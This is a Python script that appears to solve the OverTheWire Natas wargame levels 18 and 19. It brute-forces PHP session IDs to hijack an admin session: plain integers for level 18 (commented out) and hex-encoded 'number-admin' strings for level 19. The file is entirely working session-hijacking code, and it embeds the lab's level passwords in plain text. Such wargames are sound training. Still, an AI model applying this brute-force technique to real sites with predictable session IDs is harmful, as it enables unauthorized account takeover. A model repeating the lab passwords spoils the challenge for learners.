#!/usr/bin/env python3

import requests
import binascii
import phpserialize


# url = 'http://natas18.natas.labs.overthewire.org/'
# username = 'natas18'
# password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
# data = {
#     'username': 'admin',
#     'password': '',
# }

# cookie = 0
# for i in range(641):
#     cookie = dict(PHPSESSID=str(i))
#     r = requests.get(url, auth=(username, password), cookies=cookie)
#     print(cookie, end='\r')
#     if 'You are an admin' in r.text:
#         cookie = cookie
#         print(f'SUCCESS!!!! The admin cookie is {cookie}')
#         r = requests.get(url, auth=(username, password), cookies=cookie)
#         print(r.text)
#         break

###############################################################################################
                                    #Natas 19
###############################################################################################

url = 'http://natas19.natas.labs.overthewire.org/'
username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
data = {
    'username': 'admin',
    'password': '',
}

### Used the while loop below to determine what the session ID cookies pattern and length was

# while True:
#     r = requests.post(url, auth=(username, password), data=data)
#     for c in r.cookies:
#         a = str(c.value)
#         print(a)


for i in range(641):
    f = (str(i) + '-admin').encode()
    g = binascii.hexlify(f).decode()
    cookie = dict(PHPSESSID=g)
    r = requests.get(url, auth=(username, password), cookies=cookie)
    print(cookie, end='\r')
    if 'You are an admin' in r.text:
        cookie=cookie
        print(f'Success!! The admin cookie is {cookie}')
        print(r.text)
        break